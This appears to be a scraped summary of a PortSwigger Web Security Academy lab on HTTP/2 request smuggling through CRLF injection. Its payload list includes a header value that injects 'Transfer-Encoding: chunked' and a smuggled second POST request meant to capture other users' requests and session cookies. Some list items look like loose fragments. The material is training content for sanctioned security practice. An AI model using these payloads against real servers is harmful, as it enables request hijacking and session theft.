## HTTP/2 request smuggling via CRLF injection

**Category:** request_smuggling
**Difficulty:** Unknown

### Description
This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers.

### Solution Steps
To inject newlines into HTTP/2 headers, use the Inspector to drill down into the header, then press the
Shift + Return
keys. Note that this feature is not available when you double-click on the header.

### Key Payloads
- `Shift + Return`
- `POST /`
- `\r\n`
- `Transfer-Encoding: chunked`
- `bar\r\nTransfer-Encoding: chunked`
- `0

SMUGGLED`
- `0

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Length: 800

search=x`
- `404 Not Found`
- `search=x`
- `POST`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: request_smuggling

---
*Source: PortSwigger Web Security Academy*
